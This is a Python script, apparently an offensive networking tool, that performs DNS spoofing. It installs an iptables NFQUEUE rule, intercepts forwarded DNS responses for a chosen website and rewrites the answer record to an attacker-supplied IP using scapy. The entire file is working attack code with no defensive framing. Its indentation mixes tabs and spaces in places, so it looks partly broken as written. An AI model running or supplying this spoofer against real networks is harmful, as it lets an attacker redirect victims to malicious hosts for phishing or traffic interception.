#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
from colorama import Fore
import sys
import argparse
import subprocess
# command to create queue
# iptables -I FORWARD -j NFQUEUE --queue-num 0
def parse_args():
	parser = argparse.ArgumentParser()
	parser.add_argument('-t', '--target-website', dest='target_web', required=True, help="Enter target website to spoof")
	parser.add_argument('-s', '--source-ip', dest='source', required=True, help="Enter source ip to put in the DNS answer")
	parser.add_argument('-c', '--iptable-chain', dest='chain', required=True, help="Chain for the iptable rule") 
	return parser.parse_args()


def setup_iptables(chain, restore):
	subprocess.call(['iptables','-F', chain])
        if not restore:
            subprocess.call(['iptables', '-I', chain, '-j', 'NFQUEUE', '--queue-num', '0'])
            print(Fore.BLUE + "[INFO] Setting up iptable rule...")


def process_packet(packet):
	scapy.p = scapy.IP(packet.get_payload())
	if scapy.p.haslayer(scapy.DNSRR):
		qname = scapy.p[scapy.DNSQR].qname
		if args.target_web in qname:
			print(Fore.GREEN + "[+] Got a DNS REQ from : "+ scapy.p[scapy.IP].dst +", sending spoofed response...")
			# rewrite dns answer
			scapy.p[scapy.DNS].an  = scapy.DNSRR(rrname=qname, rdata=args.source)
			scapy.p[scapy.DNS].ancount = 1
			# deleting len and checksum of packet, scapy will add them when sending the packet
			del scapy.p[scapy.IP].len
			del scapy.p[scapy.IP].chksum
			del scapy.p[scapy.UDP].len
			del scapy.p[scapy.UDP].chksum
			# setting payload
			packet.set_payload(str(scapy.p))
	packet.accept()

# connect netfilterqueue to the iptable rule above
args = parse_args()
try :
    setup_iptables(args.chain, restore=False)
    print(Fore.GREEN + "[INFO] Starting DNS spoofing against target\n\n")
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
        setup_iptables(args.chain, restore=True)
	print(Fore.RED + "[-] CTRL+C caught... Flushing IPtables and quitting...")
	sys.exit(-1)




